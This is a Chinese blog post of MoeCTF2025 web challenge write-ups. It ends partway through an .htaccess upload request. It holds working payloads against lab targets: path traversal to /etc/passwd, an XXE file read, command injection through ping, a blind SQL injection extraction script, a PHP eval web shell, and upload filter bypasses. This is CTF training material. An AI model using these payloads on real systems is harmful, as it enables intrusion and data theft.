      <meta itemprop="name" content="MoeCTF2025web题解 | root@wanth3f1ag">
      <meta itemprop="description" content="MoeCTF2025web题解">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          MoeCTF2025web题解
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-09-21 09:28:09" itemprop="dateCreated datePublished" datetime="2025-09-21T09:28:09+08:00">2025-09-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:12:09" itemprop="dateModified" datetime="2025-12-01T19:12:09+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>36k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>33 分钟</span>
    </span>
</div>

            <div class="post-description">MoeCTF2025web题解</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="0-Web入门指北"><a href="#0-Web入门指北" class="headerlink" title="0 Web入门指北"></a><strong>0 Web入门指北</strong></h2><p>附件是JSFuck字符串，并且也提示了控制台，直接f12放控制台看一下输出</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921093811335.png" alt="image-20250921093811335"></p>
<h2 id="01-第一章-神秘的手镯"><a href="#01-第一章-神秘的手镯" class="headerlink" title="01 第一章 神秘的手镯"></a><strong>01 第一章 神秘的手镯</strong></h2><h3 id="前端JS"><a href="#前端JS" class="headerlink" title="#前端JS"></a>#前端JS</h3><p>在源码中看到有zhouyu.js文件</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921094629185.png" alt="image-20250921094629185"></p>
<p>注意到两行代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;unsealButton&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, validatePassword);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;passwordInput&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;paste&#x27;</span>, handlePaste);</span><br></pre></td></tr></table></figure>

<p>第一个是unsealButton启封手镯按钮的点击事件，对应validatePassword函数处理；第二个是用户在passwordInput输入框里按 Ctrl+V 或右键粘贴事件，对应handlePaste函数处理</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921095008902.png" alt="image-20250921095008902"></p>
<p>可以看到只需要传入PASSWORD就可以拿到flag，但是这里js源码中直接放了flag，直接交就行</p>
<p>正常解的话需要抓包传值，因为前端js禁用了粘贴功能。</p>
<h2 id="01-第一章-神秘的手镯-revenge"><a href="#01-第一章-神秘的手镯-revenge" class="headerlink" title="01 第一章 神秘的手镯_revenge"></a><strong>01 第一章 神秘的手镯_revenge</strong></h2><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="#备份文件泄露"></a>#备份文件泄露</h3><p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923105303609.png" alt="image-20250923105303609"></p>
<p>提示有备份文件，那得扫一下目录了，但是一直没扫出来</p>
<h2 id="02-第二章-初识金曦玄轨"><a href="#02-第二章-初识金曦玄轨" class="headerlink" title="02 第二章 初识金曦玄轨"></a><strong>02 第二章 初识金曦玄轨</strong></h2><h3 id="响应报文"><a href="#响应报文" class="headerlink" title="#响应报文"></a>#响应报文</h3><p>提示抓包了就直接抓来看看吧</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921095641034.png" alt="image-20250921095641034"></p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250921095915726.png" alt="image-20250921095915726"></p>
<h2 id="03-第三章-问剑石！篡天改命！"><a href="#03-第三章-问剑石！篡天改命！" class="headerlink" title="03 第三章 问剑石！篡天改命！"></a><strong>03 第三章 问剑石！篡天改命！</strong></h2><h3 id="HTTP传参"><a href="#HTTP传参" class="headerlink" title="#HTTP传参"></a>#HTTP传参</h3><p>题目描述里写了要改参数</p>
<p>抓包改一下参数</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test_talent?level=S</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:36139</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>40</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;139&quot;, &quot;Not;A=Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1:36139</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1:36139/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTc1ODA5MzA4MnxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXzFSUaBbGBEsxTg77L_c8gMK1zVAt1vaRY5vmZgdMIURg==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;manifestation&quot;</span><span class="punctuation">:</span><span class="string">&quot;flowing_azure_clouds&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="04-第四章-金曦破禁与七绝傀儡阵"><a href="#04-第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="04 第四章 金曦破禁与七绝傀儡阵"></a><strong>04 第四章 金曦破禁与七绝傀儡阵</strong></h2><h3 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="#HTTP请求"></a>#HTTP请求</h3><p><em>提示：使用Burp Suite、Postman等工具修改HTTP请求</em></p>
<p>第一关：使用GET方法传递参数 key&#x3D;xdsec</p>
<p>第二关：使用POST方法请求数据：declaration&#x3D;织云阁&#x3D;第一</p>
<p>第三关：请从本地访问这个页面，伪造一下请求头<code>X-Forwarded-For</code>为127.0.0.1</p>
<p>第四关：使用moe browser访问，伪造请求头<code>User-Agent</code>为moe browser</p>
<p>第五关：需要以xt的身份认证user，添加cookie键值对user&#x3D;xt</p>
<p>第六关：从<a target="_blank" rel="noopener" href="http://panshi/entry%E6%9D%A5%EF%BC%8C%E4%BC%AA%E9%80%A0%E8%AF%B7%E6%B1%82%E5%A4%B4Referer%E4%B8%BAhttp://panshi/entry">http://panshi/entry来，伪造请求头Referer为http://panshi/entry</a></p>
<p>第七关：使用PUT方法，请求体为”新生！”，这个得用postman去发包了</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923114447659.png" alt="image-20250923114447659"></p>
<p>最后合成碎片是一串base64编码，解出来就是flag了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0MwbjZyNDd1MTQ3MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==</span><br></pre></td></tr></table></figure>

<h2 id="05-第五章-打上门来！"><a href="#05-第五章-打上门来！" class="headerlink" title="05 第五章 打上门来！"></a><strong>05 第五章 打上门来！</strong></h2><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="#目录穿越"></a>#目录穿越</h3><p>省流：CTF中有一招在文件目录中穿梭的技法，是什么呢？</p>
<p>看来是考目录穿越啊，传入<code>../../../etc/passwd</code>发现能成功读到，那就直接读flag</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fle=../../../flag</span><br></pre></td></tr></table></figure>

<h2 id="06-第六章-藏经禁制？玄机初探！"><a href="#06-第六章-藏经禁制？玄机初探！" class="headerlink" title="06 第六章 藏经禁制？玄机初探！"></a><strong>06 第六章 藏经禁制？玄机初探！</strong></h2><h3 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="#SQL注入万能密码"></a>#SQL注入万能密码</h3><p>省流：一个登录页面。（不告诉我账号密码就让我登录，<del>难道我是神仙吗哈哈？</del>）</p>
<p>弱口令？一开始在源码的提示词中找到几个神识印记和心法密咒，但是都没成功，后面在题目描述中看到了提示是打SQL注入</p>
<p>万能密码就能直接打</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923141643701.png" alt="image-20250923141643701"></p>
<h2 id="07-第七章-灵蛛探穴与阴阳双生符"><a href="#07-第七章-灵蛛探穴与阴阳双生符" class="headerlink" title="07 第七章 灵蛛探穴与阴阳双生符"></a><strong>07 第七章 灵蛛探穴与阴阳双生符</strong></h2><h3 id="robots文件-md5碰撞"><a href="#robots文件-md5碰撞" class="headerlink" title="#robots文件+md5碰撞"></a>#robots文件+md5碰撞</h3><p>省流：有这样一个文件，它是一个存放在网站根目录下的纯文本文件，用于告知搜索引擎<strong>爬虫</strong>哪些页面可以抓取，哪些页面不应被抓取。它是网站与搜索引擎之间的 “协议”，帮助网站管理爬虫的访问行为，保护隐私内容、节省服务器资源或引导爬虫优先抓取重要页面。</p>
<p>提示很明显了，是robots.txt，访问&#x2F;robots.txt拿到&#x2F;flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error 2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>; error <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>md5碰撞嘛，直接打就行</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=240610708&amp;b=QNKCDZO</span><br></pre></td></tr></table></figure>

<h2 id="08-第八章-天衍真言，星图显圣"><a href="#08-第八章-天衍真言，星图显圣" class="headerlink" title="08 第八章 天衍真言，星图显圣"></a><strong>08 第八章 天衍真言，星图显圣</strong></h2><h3 id="SQL注入盲注"><a href="#SQL注入盲注" class="headerlink" title="#SQL注入盲注"></a>#SQL注入盲注</h3><p>省流：和上次一样的界面，那我再登录一次就行了……吗？</p>
<p>这次万能密码登录进去只拿到一个admin，但是是可以打盲注的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and if(1=1,1,0)#</span><br><span class="line">1</span><br><span class="line">回显Welcome admin</span><br><span class="line"></span><br><span class="line">admin&#x27; and if(1=2,1,0)#</span><br><span class="line">1</span><br><span class="line">回显登录失败，请检查神识印记与心法密咒</span><br></pre></td></tr></table></figure>

<p>直接写个脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:58535/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(ascii(substr((select value from user.flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">        r = requests.get(url=url, params=params)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>) <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="09-第九章-星墟禁制·天机问路"><a href="#09-第九章-星墟禁制·天机问路" class="headerlink" title="09 第九章 星墟禁制·天机问路"></a><strong>09 第九章 星墟禁制·天机问路</strong></h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="#命令执行"></a>#命令执行</h3><p>传入会执行ping命令，用分号隔开去打命令执行</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923154512402.png" alt="image-20250923154512402"></p>
<h2 id="10-第十章-天机符阵"><a href="#10-第十章-天机符阵" class="headerlink" title="10 第十章 天机符阵"></a><strong>10 第十章 天机符阵</strong></h2><h3 id="XXE"><a href="#XXE" class="headerlink" title="#XXE"></a>#XXE</h3><p>省流：flag在flag.txt里</p>
<p>需要传入契约内容，并且写到可以解析，猜测是xxe实体注入读取flag</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一开始没打通，后面观察到有这些标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">阵枢</span>&gt;</span>引魂玉<span class="tag">&lt;/<span class="name">阵枢</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">解析</span>&gt;</span>未定义<span class="tag">&lt;/<span class="name">解析</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span>未定义<span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以把标签改一下改成输出</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923160251293.png" alt="image-20250923160251293"></p>
<p>然后直接读flag就行</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 输出 [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="10-第十章-天机符阵-revenge"><a href="#10-第十章-天机符阵-revenge" class="headerlink" title="10 第十章 天机符阵_revenge"></a><strong>10 第十章 天机符阵_revenge</strong></h2><h3 id="XXE过滤"><a href="#XXE过滤" class="headerlink" title="#XXE过滤"></a>#XXE过滤</h3><p>这次file协议好像是被禁用了，但是好像直接传文件名也行？</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 输出 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a><strong>11 第十一章 千机变·破妄之眼</strong></h2><h3 id="爆破参数"><a href="#爆破参数" class="headerlink" title="#爆破参数"></a>#爆破参数</h3><p>省流：HDdss看到了 <strong>GET</strong> 参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入。</p>
<p>提示很明显了，直接爆破吧</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923163035397.png" alt="image-20250923163035397"></p>
<p>但是不知道为啥在浏览器传参出来是200而不是302</p>
<p>放到bp中放包截获302后的包</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923164037270.png" alt="image-20250923164037270"></p>
<p>访问&#x2F;find.php文件看到是一个读取文件的口子，但是读不了flag.php显示境界不够，估计是需要编码处理，用filter去打</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923164313494.png" alt="image-20250923164313494"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="12-第十二章-玉魄玄关·破妄"><a href="#12-第十二章-玉魄玄关·破妄" class="headerlink" title="12 第十二章 玉魄玄关·破妄"></a><strong>12 第十二章 玉魄玄关·破妄</strong></h2><h3 id="eval函数"><a href="#eval函数" class="headerlink" title="#eval函数"></a>#eval函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>我发现出题人特别喜欢把flag放env环境变量里面，刚刚连上蚁剑找不到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;env&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="13-第十三章-通幽关·灵纹诡影"><a href="#13-第十三章-通幽关·灵纹诡影" class="headerlink" title="13 第十三章 通幽关·灵纹诡影"></a><strong>13 第十三章 通幽关·灵纹诡影</strong></h2><h3 id="文件上传RCE"><a href="#文件上传RCE" class="headerlink" title="#文件上传RCE"></a>#文件上传RCE</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通幽关规则</span><br><span class="line">仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）</span><br><span class="line">灵纹尺寸不得大于三寸（30000字节）</span><br><span class="line">灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）</span><br><span class="line">违禁灵纹将触发九幽雷劫，魂飞魄散！</span><br></pre></td></tr></table></figure>

<p>限制了文件名后缀和文件大小，并且还检查了十六进制文件头</p>
<p>上传一个jpg后缀的php文件并抓包，在hex中修改文件头为ff d8 ff，将后缀改回php后发包拿到路径&#x2F;uploads&#x2F;1.php</p>
<p><img src="/../image/achieve/202411/MoeCTF2025/image-20250923170701807.png" alt="image-20250923170701807"></p>
<p>然后改一下恶意代码内容就行</p>
<h2 id="14-第十四章-御神关·补天玉碑"><a href="#14-第十四章-御神关·补天玉碑" class="headerlink" title="14 第十四章 御神关·补天玉碑"></a><strong>14 第十四章 御神关·补天玉碑</strong></h2><h3 id="配置文件上传RCE"><a href="#配置文件上传RCE" class="headerlink" title="#配置文件上传RCE"></a>#配置文件上传RCE</h3><p>省流：Apache有一个特殊文件，是什么呢？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">御神关规则</span><br><span class="line">仅受天道认可的「玉碑碎片」可修复守护大阵</span><br><span class="line">玉碑尺寸不得大于三寸（30000字节）</span><br><span class="line">禁止上传攻伐符咒（如.php, .php5, .jsp, .asp等邪道术法）</span><br><span class="line">违禁玉碑将触发九幽雷劫，魂飞魄散！</span><br></pre></td></tr></table></figure>

<p>有黑名单过滤，既然是Apache的话，直接传.htaccess配置文件去打吧</p>
<p>先随便传一个文件看看白名单文件名后缀，发现是jpg文件，那配置文件的配置应该是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:41811</span><br><span class="line">Content-Length: 224</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;139&quot;, &quot;Not;A=Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://127.0.0.1:41811</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary777cSAzvrol9Smxg</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:41811/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: session-name=MTc1ODA5MzA4MnxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXzFSUaBbGBEsxTg77L_c8gMK1zVAt1vaRY5vmZgdMIURg==</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary777cSAzvrol9Smxg</span><br><span class="line">Content-Disposition: form-data; name=&quot;jadeStele&quot;; filename=&quot;.htaccess&quot;</span><br><span 